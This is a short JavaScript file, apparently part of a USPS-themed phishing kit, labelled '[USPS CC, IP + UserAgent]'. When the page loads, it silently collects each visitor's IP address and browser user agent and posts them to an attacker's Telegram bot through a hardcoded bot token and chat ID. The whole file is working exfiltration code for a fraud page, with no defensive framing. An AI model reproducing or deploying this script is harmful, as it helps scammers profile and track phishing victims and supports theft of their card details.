
async function getUserIP() {
    try {
        const response = await axios.get('https://api64.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        console.error("Error getting IP address:", error);
        return "Unknown IP";
    }
}

// Function to get user agent
function getUserAgent() {
    return navigator.userAgent;
}

// Log and send IP address and user agent
async function logAndSendUserInfo() {
    const ipAddress = await getUserIP();
    const userAgent = getUserAgent();

    const ipAndUserAgentLog = `
    \n
    <b>[USPS CC, IP + UserAgent]</b>
    \n
    <b>IP Address: </b>${ipAddress}
    \n
    <b>User Agent: </b>${userAgent}
    \n`;

    // Telegram Bot API endpoint and chat ID
    const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
    const chatId = '6391433593';

    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    try {
        const response = await axios.post(telegramApiUrl, {
            chat_id: chatId,
            text: ipAndUserAgentLog,
            parse_mode: 'HTML',
        });

    } catch (error) {
        console.error("Error sending IP:", error);
    }
}

// Call the logAndSendUserInfo function when the page loads
document.addEventListener('DOMContentLoaded', logAndSendUserInfo);